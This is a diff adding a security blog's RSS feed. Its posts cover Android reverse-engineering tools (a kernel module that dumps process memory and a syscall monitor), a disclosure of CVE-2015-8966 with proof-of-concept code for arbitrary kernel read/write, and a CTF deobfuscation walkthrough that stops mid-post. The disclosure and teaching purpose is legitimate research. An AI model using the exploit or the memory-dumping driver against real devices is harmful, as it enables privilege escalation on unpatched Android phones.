@@ -1,0 +1,852 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Pwned by ThomasKing</title>
+    <description>Pwn everything including myself.
+</description>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
+    <pubDate>Thu, 14 Dec 2017 23:07:54 +0800</pubDate>
+    <lastBuildDate>Thu, 14 Dec 2017 23:07:54 +0800</lastBuildDate>
+    <generator>Jekyll v3.6.2</generator>
+    
+      <item>
+        <title>来自高纬的对抗</title>
+        <description>&lt;h2 id=&quot;一序&quot;&gt;一、序&lt;/h2&gt;
+&lt;p&gt;无论是逆向分析还是漏洞利用，我所理解的攻防博弈无非是二者在既定的某一阶段，以高纬的方式进行对抗，并不断地升级纬度。比如，逆向工程人员一般会选择在Root的环境下对App进行调试分析，其是以root的高权限对抗受沙盒限制的低权限；在arm64位手机上进行root/越狱时，ret2usr利用技术受到PXN机制的约束，厂商从修改硬件特性的高纬度进行对抗，迫使漏洞研究者提高利用技巧。&lt;/p&gt;
+
+&lt;p&gt;下文将在Android逆向工程方面，分享鄙人早期从维度攻击的角度所编写的小工具。工具本身可能已经不能适应现在的攻防，“授人以鱼不如授人以渔”，希望能够给各位读者带来一些思路，构建自己的分析利器。&lt;/p&gt;
+
+&lt;h2 id=&quot;二正&quot;&gt;二、正&lt;/h2&gt;
+
+&lt;h3 id=&quot;0x00-自定义loader&quot;&gt;0x00 自定义Loader&lt;/h3&gt;
+
+&lt;p&gt;早期Android平台对SO的保护采用畸形文件格式和内容加密的方式来对抗静态分析。随着IDA以及F5插件地不断完善和增多，IDA已经成为了逆向人员的标配工具。正因如此，IDA成为了畸形文件格式的对抗目标。畸形方式从减少文件格式信息到构造促使IDA加载crash的变化正应证了这一点。对此，鄙人研究通过重建&lt;a href=&quot;http://bbs.pediy.com/thread-192874.htm&quot;&gt;文件格式信息&lt;/a&gt;的方式来让IDA正常加载。&lt;/p&gt;
+
+&lt;p&gt;在完成编写修复重建工具不久之后，鄙人在一次使用IDA的加载bin文件时，猛然意识到畸形文件格式的对抗目标是IDA对ELF文件的加载的默认loader。既然防御的假象和维度仅仅在于默认loader，那么以自定义的loader加载实现高纬攻击，理论是毫无敌手的。&lt;/p&gt;
+
+&lt;p&gt;那如何来实现IDA自定义loader呢？&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;以Segment加载的流程对ELF文件进行解析，获取和重建Section信息(参看上面所说贴子)。&lt;/li&gt;
+  &lt;li&gt;把文件信息在IDA中进行展示，直接调用对应的IDAPython接口&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;实现加载bin文件的py代码见文末github链接，直接放置于IDA/loaders目录即可。由于早期少有64位的安卓手机，加载脚本仅支持arm 32位格式，有兴趣读者可以改写实现全平台通用。不同ndk版本所编译文件中与动态加载无关的Section不一定存在，注释相应的重建代码即可。&lt;/p&gt;
+
+&lt;h3 id=&quot;0x01-kernel-helper&quot;&gt;0x01 Kernel Helper&lt;/h3&gt;
+
+&lt;p&gt;以APP分析为例，对于加固过的应用通常会对自身的运行环境进行检测。比如: 检测自身调试状态，监控proc文件等。相信各位读者有各种奇淫技巧来绕过，早期鄙人构建hook环境来绕过。从维度的角度，再来分析这种对抗。对于APP或者bin文件而言，其仅运行于受限的环境中，就算exp提权后也只是权限的提升和对内核有一定的访问控制权。对于Android系统而言，逆向人员不仅能够拿到root最高权限，而且还可以修改系统的所有代码。从攻防双方在运行环境的维度来看，“魔”比”道“高了不只三丈，防御方犹如板上鱼肉。而在代码维度，防御方拥有源代码的控制权，攻防处于完全劣势。随着代码混淆和VMP技术的运用，防御方这块鱼肉越来越不好”啃”。&lt;/p&gt;
+
+&lt;p&gt;对于基于linux的安卓系统而言，进程的运行环境和结构是由内核来提供和维护的。从修改内核的维度来对抗，能达到一些不错的效果。下文将详述在内核态dump目标进程内存和系统调用监控。&lt;/p&gt;
+
+&lt;h3 id=&quot;1-内存dump&quot;&gt;1. 内存DUMP&lt;/h3&gt;
+
+&lt;p&gt;对内核添加一些自定义功能时，通常可以采用内核驱动来实现。虽然一部分Android手机支持驱动ko文件加载，但内核提供的其他工具则不一定已经编译到内核，在后文中可以看到。nexus系列手机是谷歌官方所支持的，编译刷机都比较方便，推荐使用。&lt;/p&gt;
+
+&lt;p&gt;S1. 编译内核&lt;/p&gt;
+
+&lt;p&gt;为了让内核支持驱动ko文件的加载，在make memuconfig配置内核选项时，以下勾选:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[*] Enable loadable module support
+	次级目录所有选项
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;编译步骤参看谷歌官方提供的内核编译步骤。&lt;/p&gt;
+
+&lt;p&gt;S2. 驱动代码&lt;/p&gt;
+
+&lt;p&gt;linux系统支持多种驱动设备，这里采用最简单的字符设备来实现。与其他操作系统类似，linux驱动程序也分为入口和出口。在module_init入口中，对字符设备进行初始化，创建/dev/REHelper字符设备。文末代码采用传统的方式对字符设备进行注册，也可直接使用misc的方式。字符设备的操作方式通过注册file_operations回调实现，其中ioctl函数比较灵活，满足实现需求。&lt;/p&gt;
+
+&lt;p&gt;定义command ID:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#define CMD_BASE 0xC0000000
+#define DUMP_MEM (CMD_BASE + 1)
+#define SET_PID  (CMD_BASE + 2)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;构建dump_request参数:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;struct dump_request{
+    pid_t pid;	//目标进程
+    unsigned long addr;		//目标进程dump起始地址
+    ssize_t count;	//dump的字节数
+    char __user *buf;	//用户空间存储buf
+};
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;在ioctl中实现分支:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;case DUMP_MEM:
+    target_task = find_task_by_vpid(request-&amp;gt;pid); //对于用户态，进程通过进程的pid来标示自身；在内核空间，通过pid找到对应的进程结构task_struct
+    if(!target_task){
+        printk(KERN_INFO &quot;find_task_by_vpid(%d) failed\n&quot;, request-&amp;gt;pid);
+        ret = -ESRCH;
+        return ret;
+    }
+    request-&amp;gt;count = mem_read(target_task-&amp;gt;mm, request-&amp;gt;buf, request-&amp;gt;count, request-&amp;gt;addr);	 //进程的虚拟地址空间同样由内核进程管理，通过mm_struct结构组织
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;mem_read其实是对mem_rw函数的封装，mem_rw能够读写目标进程，简略流程:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;static ssize_t mem_rw(struct mm_struct *mm, char __user *buf,
+            size_t count, unsigned long addr, int write)
+{
+    ssize_t copied;
+    char *page;
+	
+	...
+	
+    page = (char *)__get_free_page(GFP_TEMPORARY); // 获取存储数据的临时页面
+	
+	...
+
+    while (count &amp;gt; 0) {
+        int this_len = min_t(int, count, PAGE_SIZE);
+		
+		  // 将写入数据从用户空间拷贝到内核空间
+        if (write &amp;amp;&amp;amp; copy_from_user(page, buf, this_len)) {
+            copied = -EFAULT;
+            break;
+        }
+		 
+		 // 对目标进程进行读或写操作，具体实现参看内核源码
+        this_len = access_remote_vm(mm, addr, page, this_len, write);
+		 // 将获取到的目标进程数据从内核拷贝到用户空间
+        if (!write &amp;amp;&amp;amp; copy_to_user(buf, page, this_len)) {
+            copied = -EFAULT;
+            break;
+        }
+		 ...			 
+    }
+    ...
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;内核驱动部分的dump功能实现，接着只需在用户空间访问驱动程序即可。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;// 构造ioctl参数
+request.pid = atoi(argv[1]);
+request.addr = 0x40000000;
+request.buf = buf;
+request.count = 1000;
+
+// 打开内核驱动
+int fd = open(&quot;/dev/REHelper&quot;, O_RDWR);
+// 发送读取命令
+ioctl(fd, DUMP_MEM, &amp;amp;request);
+close(fd);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;S3. 测试&lt;/p&gt;
+
+&lt;p&gt;文末代码中，dump_test为目标进程，dump_host通过内核驱动获取目标进程的数据。insmod和dump_host以root权限运行即可。&lt;/p&gt;
+
+&lt;h3 id=&quot;2-系统调用监控&quot;&gt;2. 系统调用监控&lt;/h3&gt;
+
+&lt;p&gt;通常情况下，APP通过动态链接库libc.so间接的进行系统调用，直接在用户态hook libc.so的函数即可实现监控。而对于静态编译的bin文件和通过svc汇编指令实现的系统调用，用户态直接hook是不好处理的。道理很简单，系统调用由内核实现，hook也应该在内核。&lt;/p&gt;
+
+&lt;p&gt;linux系统的系统调用功能统一存在syscall表中，syscall表通常编译放在内核映像的代码段，修改syscall表需要修改内核页属性，感兴趣的读者可以找到linux rootkit方面的资料。本文对系统调用监控的实现，采用内核从2.6支持的probe功能来实现，选用的最重要原因是：通用性。在不同abi平台通过汇编实现系统调用的读者应该知道，不同abi平台的系统调用功能号并不一定相同，这就意味其在syscall表中的数组索引是不一致的，还需要额外的判定，实现并不优雅。&lt;/p&gt;
+
+&lt;p&gt;linux内核提供了kprobe、jprobe和kretprobe三种方式。限于篇幅，仅介绍利用jprobe实现系统调用监控。感兴趣的读者可以参看内核Documentation/kprobes.txt文档以及samples目录下的例子。&lt;/p&gt;
+
+&lt;p&gt;S1. 编译选项&lt;/p&gt;
+
+&lt;p&gt;为了能够支持probe功能，需在上述开启驱动ko编译选项的基础上勾选kprobe选项。如果没有开启内核驱动选项，是不会有kprobes(new)选项的&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;General setup ---&amp;gt;
+	[*] Kprobes(New)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;S2. 驱动代码&lt;/p&gt;
+
+&lt;p&gt;以监控sys_open系统调用为例。首先，在module_init函数中对调用register_jprobes进行注册。注册信息封装在struct jprobe结构中。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;static struct jprobe open_probe = {
+    .entry          = jsys_open,	//回调函数
+    .kp = {
+        .symbol_name    = &quot;sys_open&quot;, //系统调用名称
+    },
+};
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;由于系统调用为所有进程提供服务，不加入过滤信息会造成监控信息过多。回调函数的声明和被监控系统调用的声明一致。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;asmlinkage int jsys_open(const char *pathname, int flags, mode_t mode){
+pid_t current_pid = current_thread_info()-&amp;gt;task-&amp;gt;tgid;    
+// 从当前上下文中获取进程的pid
+
+ // monitor_pid初始化-1，0为全局监控。
+if(!monitor_pid || (current_pid == monitor_pid)){
+    printk(KERN_INFO &quot;[open] pathname %s, flags: %x, mode: %x\n&quot;, 
+        pathname, flags, mode);
+}
+
+jprobe_return();
+return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;对monitor_pid的设置通过驱动的ioctl来设置，参数简单直接设置。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;case SET_PID:
+   		monitor_pid = (pid_t) arg;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;S3. 测试&lt;/p&gt;
+
+&lt;p&gt;文末代码bin_wrapper和ptrace_trace均为静态编译，bin_wrapper通过设置监控对ptrace_trace的进行监控。内核prink的打印信息通过cat /proc/kmsg获取，输出类似如下:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;6&amp;gt;[34728.283575] REHelper device open success!
+&amp;lt;6&amp;gt;[34728.285504] Set monitor pid: 3851
+&amp;lt;6&amp;gt;[34728.287851] [openat] dirfd: -100, pathname /dev/__properties__, flags: a8000, mode: 0
+&amp;lt;6&amp;gt;[34728.289348] [openat] dirfd: -100, pathname /proc/stat, flags: 20000, mode: 0
+&amp;lt;6&amp;gt;[34728.291325] [openat] dirfd: -100, pathname /proc/self/status, flags: 20000, mode: 0
+&amp;lt;6&amp;gt;[34728.292016] [inotify_add_watch]: fd: 4, pathname: /proc/self/mem, mask: 23
+&amp;lt;6&amp;gt;[34729.296569] PTRACE_PEEKDATA: [src]pid = 3851 --&amp;gt; [dst]pid = 3852, addr: 40000000, data: be919e38
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;三尾&quot;&gt;三、尾&lt;/h2&gt;
+
+&lt;p&gt;本文介绍了鄙人对攻防的维度思考，以及从维度分析来实现的早期工具的部分介绍。希望能够给各位读者带来一些帮助和思考。限于鄙人水平，难免会有疏漏或者错误之处，敬请各位指出，谢谢。&lt;/p&gt;
+
+&lt;h2 id=&quot;四附&quot;&gt;四、附&lt;/h2&gt;
+&lt;p&gt;https://github.com/ThomasKing2014/ReverseTinytoolDemo&lt;/p&gt;
+
+</description>
+        <pubDate>Fri, 24 Feb 2017 21:13:34 +0800</pubDate>
+        <link>http://localhost:4000/2017/02/24/TinyTool.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2017/02/24/TinyTool.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Disclosure of AndroidID-31435731</title>
+        <description>&lt;p&gt;This issue has been released in the &lt;a href=&quot;https://source.android.com/security/bulletin/2016-12-01.html&quot;&gt;December&lt;/a&gt; 2016 Android Security Bulletin.&lt;/p&gt;
+
+&lt;p&gt;I found it occasionlly Nov 2015. The root problem is very simple and clear, but it can lead privilege escalation easily.&lt;/p&gt;
+
+&lt;p&gt;It seems that this issue is not the first time to be discussed. So there is just an old CVE number(CVE-2015-8966) assigned to it, not a new one.&lt;/p&gt;
+
+&lt;h2 id=&quot;0x1-analysis&quot;&gt;0x1 Analysis&lt;/h2&gt;
+&lt;p&gt;The security bug exists in legacy syscall “fcntl64” of ARM architecture. The details as follow:&lt;/p&gt;
+
+&lt;p&gt;asmlinkage long sys_oabi_fcntl64(unsigned int fd, unsigned int cmd,&lt;br /&gt;
+				 unsigned long arg){&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;struct oabi_flock64 user;
+struct flock64 kernel;
+mm_segment_t fs = USER_DS; /* initialized to kill a warning */
+unsigned long local_arg = arg;
+int ret;
+
+switch (cmd) {
+case F_OFD_GETLK:
+case F_OFD_SETLK:
+case F_OFD_SETLKW:
+case F_GETLK64:
+case F_SETLK64:
+case F_SETLKW64:
+	if (copy_from_user(&amp;amp;user, (struct oabi_flock64 __user *)arg,
+			   sizeof(user)))
+		return -EFAULT;
+	kernel.l_type	= user.l_type;
+	kernel.l_whence	= user.l_whence;
+	kernel.l_start	= user.l_start;
+	kernel.l_len	= user.l_len;
+	kernel.l_pid	= user.l_pid;
+	local_arg = (unsigned long)&amp;amp;kernel;
+	fs = get_fs();
+	set_fs(KERNEL_DS);          //[1]
+}
+
+ret = sys_fcntl64(fd, cmd, local_arg);
+
+switch (cmd) {
+case F_GETLK64:
+	if (!ret) {
+		...
+	}
+case F_SETLK64:
+case F_SETLKW64:
+	set_fs(fs);     //[2]
+}
+return ret;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;At point [1], the KERNEL_DS is set directly. And it tries to set back at point [2]. If the cmd is one of “{F_OFD_GETLK, F_OFD_SETLK, F_OFD_SETLKW}”, the USER_DS will not set back at point [2]. So it can gain the ability of arbitrary kernel read/write, which can lead privilege escalation.&lt;/p&gt;
+
+&lt;h2 id=&quot;0x2-proof-of-concept&quot;&gt;0x2 Proof Of Concept&lt;/h2&gt;
+&lt;p&gt;The poc code as follow:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;__attribute__((naked)) long sys_oabi_fcntl64(unsigned int fd, unsigned int cmd, unsigned long arg){
+	__asm __volatile (
+	&quot;swi	0x9000DD\n&quot;
+	&quot;mov	pc, lr\n&quot;
+	:   
+	:
+	:
+);
+}
+
+#define F_OFD_GETLK	36
+#define F_OFD_SETLK	37
+#define F_OFD_SETLKW 38
+
+int main(int argc, char const *argv[]){
+	int fd = open(&quot;/proc/cpuinfo&quot;, O_RDONLY);
+	struct flock *map_base = 0;
+
+	if(fd == -1){
+		perror(&quot;open&quot;);
+		return -1;
+	}
+	map_base = (struct flock *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	if(map_base == (void*)-1){
+		perror(&quot;mmap&quot;);
+		goto _done;
+	}
+	printf(&quot;map_base %p\n&quot;, map_base);
+	memset(map_base, 0, 0x1000);
+	map_base-&amp;gt;l_start = SEEK_SET;
+	if(sys_oabi_fcntl64(fd, F_OFD_GETLK, (long)map_base)){
+		perror(&quot;sys_oabi_fcntl64&quot;);
+	}
+	// Arbitrary kernel read/write test
+	if(try_to_read_kernel()){
+		printf(&quot;pwnned !\n&quot;);
+	}
+	munmap(map_base, 0x1000);
+_done:
+	close(fd);
+	return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This vulnerability exists in kernel from 3.15 to 4.3. It only impacts Android kernel 3.18.&lt;/p&gt;
+
+&lt;h2 id=&quot;0x3-timeline&quot;&gt;0x3 Timeline&lt;/h2&gt;
+&lt;p&gt;Sep 10, 2016 - reported the issue to Kernel Security&lt;/p&gt;
+
+&lt;p&gt;Sep 15, 2016 - Kernel Security prepared to fix it in next round of stable kernels&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;Sep 10, 2016 - reported the issue to Google after tested on goldfish 3.18&lt;/p&gt;
+
+&lt;p&gt;Sep 12, 2016 - Google reviewed the issue and set the severity to Critical&lt;/p&gt;
+
+&lt;p&gt;Oct 04, 2016 - Google determined that this issue does not impact any Google devices&lt;/p&gt;
+
+&lt;p&gt;Dec 05, 2016 - released in December 2016 Android Security Bulletin&lt;/p&gt;
+</description>
+        <pubDate>Mon, 05 Dec 2016 21:13:34 +0800</pubDate>
+        <link>http://localhost:4000/2016/12/05/CVE-2015-8966.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2016/12/05/CVE-2015-8966.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>记一次混淆算法逆向分析</title>
+        <description>&lt;h2 id=&quot;一前言&quot;&gt;一、前言&lt;/h2&gt;
+&lt;p&gt;小弟最近整理之前的资料，偶然发现半年前的混淆对抗研究以及一道CTF练习题目，故分享以作记录。限于水平，难免会有疏漏或者错误之处，望各位读者批评指正。&lt;/p&gt;
+
+&lt;h2 id=&quot;二基本分析&quot;&gt;二、基本分析&lt;/h2&gt;
+&lt;p&gt;jeb打开文件，找到方法校验方法。逻辑很简单，校验函数既是Native函数check.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;public native boolean check(String arg1) {
+}
+
+protected void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    this.setContentView(2130903040);
+    this.inputCode = this.findViewById(2131099648);
+    this.btn_submit = this.findViewById(2131099649);
+    this.btn_submit.setOnClickListener(new View$OnClickListener() {
+        public void onClick(View v) {
+            if(MainActivity.this.check(MainActivity.this.inputCode.getText().toString())) {
+                MainActivity.this.startActivity(new Intent(MainActivity.this, ResultActivity.class));
+            }
+            else {
+                Toast.makeText(MainActivity.this.getApplicationContext(), &quot;Incorrect Password!&quot;, 
+                        0).show();
+            }
+        }
+    });
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;直接使用IDA默认Loader打开直接崩溃，存在畸形ELF文件对抗，使用自定义LOADER加载，也是然并卵的节奏。&lt;br /&gt;
+使用Tracer动态打印check函数地址，挂起进程，dump出对应的代码段加载到IDA，找到check函数。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;seg000:4561E4E8 check
+seg000:4561E4E8                 LDR             PC, =sub_4561E4EC
+seg000:4561E4E8 ; End of function check
+seg000:4561E4E8
+seg000:4561E4EC ; =============== S U B R O U T I N E 	seg000:4561E4EC sub_4561E4EC                            ; CODE XREF: checkj
+seg000:4561E4EC                                         ; DATA XREF: 	seg000:4561E4EC                 STMFD           SP!, {R0-R12,LR}
+seg000:4561E4F0                 LDR             R0, =6
+seg000:4561E4F4                 B               loc_4561E444
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;通过分析发现，其实为一个汇编stub，通过此stub跳到真正的check函数。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;seg013:80A0135C sub_80A0135C                            ; DATA XREF: seg013:80A13F98o
+seg013:80A0135C                 B               sub_80A065B8
+seg013:80A0135C ; End of function sub_80A0135C
+seg013:80A01360
+seg013:80A01360 ; =============== S U B R O U T I N E	seg013:80A01360 ; Attributes: thunk
+seg013:80A01360
+seg013:80A01360 sub_80A01360                            ; DATA XREF: sub_80A065C4+Co
+seg013:80A01360                 B               sub_80A065F8
+seg013:80A01360 ; End of function sub_80A01360
+seg013:80A01364 ; =============== S U B R O U T I N E 	seg013:80A01364 ; Attributes: thunk
+seg013:80A01364
+seg013:80A01364 sub_80A01364                            ; CODE XREF: sub_80A06620j
+seg013:80A01364                 B               sub_80A0663C
+seg013:80A01364 ; End of function sub_80A01364
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;以80A0135C(B sub_80A065B8)为例子，跟进sub_80A065B8，可以看到如下指令：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;// 0x80A0135C
+seg013:80A065B8                 BEQ             loc_80A0658C
+seg013:80A065BC                 BNE             loc_80A0658C
+
+seg013:80A0658C                 STMFD           SP!, {R3-R8,R10,LR} 真实指令
+seg013:80A06590                 STMFD           SP!, {R8,LR}
+seg013:80A06594                 LDR             R8, loc_80A065A4
+seg013:80A06598                 LDR             R8, loc_80A065A8
+seg013:80A0659C                 LDR             R8, loc_80A065AC
+seg013:80A065A0                 LDR             R8, locret_80A065B0
+seg013:80A065A4                 LDR             R8, =(sub_80A065C4 - 0x80A065B0)
+seg013:80A065A8                 ADD             R8, PC, R8 ; sub_80A065C4
+seg013:80A065AC                 STR             R8, [SP,#4]
+seg013:80A065B0                 LDMFD           SP!, {R8,PC}
+
+seg013:80A065C4                 STMFD           SP!, {R8,LR}
+seg013:80A065C8                 LDR             R8, =0xFFFFAD25
+seg013:80A065CC                 EOR             R8, R8, #0xAD
+seg013:80A065D0                 ADD             R8, PC, R8 ; loc_80A01360 //返回到80A01360
+seg013:80A065D4                 STR             R8, [SP,#8+var_4]
+seg013:80A065D8                 LDMFD           SP!, {R8,PC}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;通过分析可以得到真实指令(STMFD SP!, {R3-R8,R10,LR})，其余指令为混淆指令，最终返回到下一条B即80A01360(B sub_80A065F8)指令。通过分析其他B指令，可以得到类似的混淆指令中夹在一条真实指令，只是存在多种混淆的方式。&lt;br /&gt;
+至此，我们可以得到此混淆的思路：执行”一个B指令”即一条真实的指令，混淆抽象为:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;执行前跳转混淆
+真实指令
+执行后跳转混淆
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;不难发现，如果仅仅靠一条一条的寻找真实指令，是非常费时费力的。由于执行前后都存在多种模式的混淆，但总的模式是有限的，那么通过提取指令特征匹配即可以自动化实现去混淆，找出真实指令。&lt;/p&gt;
+
+&lt;h2 id=&quot;二基于指令特征匹配对抗混淆&quot;&gt;二、基于指令特征匹配对抗混淆&lt;/h2&gt;
+&lt;p&gt;通过分析找到所有的混淆模式，最后大概几种。限于篇幅，列举一些做说明&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;// 0x80A0135C
+seg013:80A065B8                 BEQ             loc_80A0658C
+seg013:80A065BC                 BNE             loc_80A0658C
+
+seg013:80A0658C                 STMFD           SP!, {R3-R8,R10,LR} 真实指令
+
+seg013:80A06590                 STMFD           SP!, {R8,LR}
+seg013:80A06594                 LDR             R8, loc_80A065A4
+seg013:80A06598                 LDR             R8, loc_80A065A8
+seg013:80A0659C                 LDR             R8, loc_80A065AC
+seg013:80A065A0                 LDR             R8, locret_80A065B0
+seg013:80A065A4                 LDR             R8, =(sub_80A065C4 - 0x80A065B0)
+seg013:80A065A8                 ADD             R8, PC, R8 ; sub_80A065C4
+seg013:80A065AC                 STR             R8, [SP,#4]
+seg013:80A065B0                 LDMFD           SP!, {R8,PC}
+
+seg013:80A065C4                 STMFD           SP!, {R8,LR}
+seg013:80A065C8                 LDR             R8, =0xFFFFAD25
+seg013:80A065CC                 EOR             R8, R8, #0xAD
+seg013:80A065D0                 ADD             R8, PC, R8 ; loc_80A01360
+seg013:80A065D4                 STR             R8, [SP,#8+var_4]
+seg013:80A065D8                 LDMFD           SP!, {R8,PC}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;执行前混淆：B(连续两条条件完全相反的指令) next_jmp&lt;br /&gt;
+执行后混淆：这里有两组STMFD–LDMFD构成的跳转stub,但其是为一种模式。那如何计算next_jmp呢？这里我采用取巧的方式，通过从LDMFD所在地址反向找到ADD指令，得到”;loc_80a01360”，再解析出地址80a01360。当然，存在多种prefix，需要作简单处理获取地址。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;def prefix_match(str):
+	pattern = ['sub_', 'loc_', 'unk_', 'locret_']
+	for prefix in pattern:
+		if str.find(prefix) &amp;gt; -1:
+			substr = str[str.find(prefix) + len(prefix):]
+			return string.atoi(substr, 16)
+	return 0xffffffff;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;真实指令：通过解析跳转遍历完整个混淆后，通过堆栈平衡原理，提取出真实指令。以上述分析为例，遍历回到下一条指令80a01360后，对指令进行分组即(B)(STMFD SP!, {R3-R8,R10,LR})(STMFD-LDMFD)(STMFD-LDMFD)，非常容易获取真实指令。实现时，可将分组过程可融入到指令的遍历即可。&lt;/p&gt;
+
+&lt;p&gt;再接着看另一组混淆，以80A01360(B sub_80A065F8)为例。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;// 0x80A01360
+seg013:80A065F8                 STMFD           SP!, {R0,LR}
+seg013:80A065FC                 LDR             R0, loc_80A0660C
+seg013:80A06600                 LDR             R0, loc_80A06610
+seg013:80A06604                 LDR             R0, loc_80A06614
+seg013:80A06608                 LDR             R0, locret_80A06618
+seg013:80A0660C                 LDR             R0, =(loc_80A065E0 - 0x80A06618)
+seg013:80A06610                 ADD             R0, PC, R0 ; loc_80A065E0
+seg013:80A06614                 STR             R0, [SP,#4]
+seg013:80A06618
+seg013:80A06618                 LDMFD           SP!, {R0,PC}
+
+seg013:80A065E0                 LDR             R3, [R0] //真实指令
+
+seg013:80A065E4                 STMFD           SP!, {R0,LR}
+seg013:80A065E8                 MOV             LR, PC
+seg013:80A065EC                 BL              loc_80A065F0
+seg013:80A065F0
+seg013:80A065F0 loc_80A065F0                            ; CODE XREF: seg013:80A065ECj
+seg013:80A065F0                 LDMFD           SP!, {R0,LR}
+
+seg013:80A065F4                 B               sub_80A06620
+
+seg013:80A06620                 B               sub_80A01364
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;执行前混淆：STMFD-LDMFD跳转到loc_80A065E0。获取next_jmp和上述一致。&lt;br /&gt;
+执行后混淆：通过STMFD-LDMFD和两次B直接跳转返回到下一条B指令地址sub_80A01364。&lt;br /&gt;
+真实指令：和上述类似，遍历混淆指令时，对指令进行分组(STMFD-LDMFD)、(LDR R3, [R0])、(B)、(B)。易获取真实指令(LDR R3, [R0])。&lt;/p&gt;
+
+&lt;p&gt;通过上述方法，大概分析20个多有的B指令即可找到所有的混淆模式，总的来说混淆的模式是有限的。&lt;br /&gt;
+通过编写IDAPython脚本，即可实现自动打印真实指令。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;0x80a0135c            PUSH            {r3, r4, r5, r6, r7, r8, sl, lr}
+0x80a01360            LDR             r3, [r0]
+0x80a01364            MOV             r1, r2
+0x80a01368            MOV             r6, r2
+0x80a0136c            LDR             r3, [r3, #0x2a4]
+0x80a01370            MOV             r2, #0
+0x80a01374            MOV             r4, r0
+0x80a01378            BLX             r3
+0x80a0137c            MOV             r7, r0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;但存在问题，当IDA并没有识别出指令时，无法通过GetMnem等API获取信息。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thomasking2014.github.io/images/2015-12-21-pic01.jpg&quot; alt=&quot;图1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;由于混淆对IDA指令识别的影响，致使IDA无法自动将指令反汇编出来。可能已经有读者意识到，遇到这种情况直接调用MakeCode将数据转化为指令即可。然而，实际使用MakeCode自动处理时，并不能完成手动按’C’识别指令的功能。那么，是否遇到这种情况后，就手动去完成指令反汇编呢？答案是否定的。由于存在很多这种情况，手动转化也很费时(测试环境IDA6.8)。&lt;/p&gt;
+
+&lt;p&gt;到这里可以看到，单纯依靠简单的字符串匹配比较的方法，并不能完全满足自动化提取指令对抗混淆的需求。&lt;/p&gt;
+
+&lt;h2 id=&quot;三基于指令解析执行对抗混淆&quot;&gt;三、基于指令解析执行对抗混淆&lt;/h2&gt;
+&lt;p&gt;通过上述分析，由于IDA存在无法自动反汇编一部分opcode数据，故单纯依靠IDAPython是无法满足指令解析指令的需求的。为了实现对指令的解析，可采用两种途径：1、对照arm汇编手册，编写常见的opcode解析脚本。以笔者的经验，这部分内容是比较耗时的。2、引入现有的反汇编引擎，且这种反汇编引擎具备对指令的想尽分析的能力。这里，我选用Capstone。&lt;/p&gt;
+
+&lt;p&gt;Capstone是一款支持多种架构的反汇编引擎，支持对汇编指令粗略和详细的分析，支持多种语言。当然，Capstone还有很多其他优点，这里就不赘述了。&lt;/p&gt;
+
